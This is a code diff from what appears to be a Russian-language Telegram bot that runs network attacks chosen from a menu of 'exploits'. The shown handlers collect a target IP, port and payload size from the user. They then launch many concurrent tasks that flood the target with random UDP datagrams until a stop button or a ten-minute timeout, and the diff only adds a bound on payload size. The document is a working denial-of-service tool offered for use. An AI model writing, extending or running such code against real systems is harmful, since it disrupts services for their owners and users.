@@ -114,13 +114,15 @@ async def enter_port(message: types.Message, state: FSMContext):
             if 'ports' in state_data.keys():
                 if message.text in state_data['ports']:
                     state_data['port'] = int(message.text)
-                    await message.answer("Введите размер данных, которыми хотите провести атаку.")
+                    await message.answer("Введите размер данных, которыми хотите провести атаку.\n"
+                                         "Допустимый диапазон [0; 60000]")
                     await DosState.size.set()
                 else:
                     await message.answer("Вы ввели порт не из списка. Попробуйте ещё раз.")
             else:
                 state_data['port'] = int(message.text)
-                await message.answer("Введите размер данных, которыми хотите провести атаку.")
+                await message.answer("Введите размер данных, которыми хотите провести атаку.\n"
+                                     "Допустимый диапазон [0; 60000]")
                 await DosState.size.set()
     else:
         await message.answer("Вы ввели не числовое значение. Попробуйте ещё раз.")
@@ -142,31 +144,34 @@ async def enter_size(message: types.Message, state: FSMContext):
         await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                              "Выберите эксплойт.", reply_markup=start_markup)
     elif message.text.isnumeric():
-        await state.update_data(size=int(message.text))
-        async with state.proxy() as state_data:
-            await DosState.stop_script.set()
-            await message.answer("Скрипт выполняется. Для остановки нажмите на кнопку STOP.\n"
-                                 "Так же был определён таймаут в 10 минут, чтобы не было большого количества запросов.",
-                                 reply_markup=stop_script_markup)
-            connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            ip = state_data['ip']
-            port = state_data['port']
-            size = state_data['size']
-            attack = os.urandom(size)
-            task_get_ping = asyncio.create_task(get_ping(message, state_data))
-            task_get_timeout = asyncio.create_task(get_timeout())
-            tasks = [task_get_ping, task_get_timeout]
-            for i in range(int(state_data['count_script'])):
-                tasks.append(asyncio.create_task(start_dos(connect, ip, port, attack)))
-            finished, unfinished = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-            for task in unfinished:
-                task.cancel()
-            connect.close()
-            await asyncio.sleep(3)
-        if await dp.current_state().get_state() == 'DosState:stop_script':
-            await message.answer("Сработал таймаут. Скрипт успешно выполнен. Возврат в главное меню.\n"
-                                 "Выберите эксплойт.", reply_markup=start_markup)
-            await state.reset_state()
+        if int(message.text) <= 60000 and int(message.text) >= 0:
+            await state.update_data(size=int(message.text))
+            async with state.proxy() as state_data:
+                await DosState.stop_script.set()
+                await message.answer("Скрипт выполняется. Для остановки нажмите на кнопку STOP.\n"
+                                     "Так же был определён таймаут в 10 минут, чтобы не было большого количества запросов.",
+                                     reply_markup=stop_script_markup)
+                connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                ip = state_data['ip']
+                port = state_data['port']
+                size = state_data['size']
+                attack = os.urandom(size)
+                task_get_ping = asyncio.create_task(get_ping(message, state_data))
+                task_get_timeout = asyncio.create_task(get_timeout())
+                tasks = [task_get_ping, task_get_timeout]
+                for i in range(int(state_data['count_script'])):
+                    tasks.append(asyncio.create_task(start_dos(connect, ip, port, attack)))
+                finished, unfinished = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+                for task in unfinished:
+                    task.cancel()
+                connect.close()
+                await asyncio.sleep(3)
+            if await dp.current_state().get_state() == 'DosState:stop_script':
+                await message.answer("Сработал таймаут. Скрипт успешно выполнен. Возврат в главное меню.\n"
+                                     "Выберите эксплойт.", reply_markup=start_markup)
+                await state.reset_state()
+        else:
+            await message.answer("Вы ввели неверное число. Попробуйте ещё раз.")
     else:
         await message.answer("Вы ввели не числовое значение. Попробуйте ещё раз.")
 
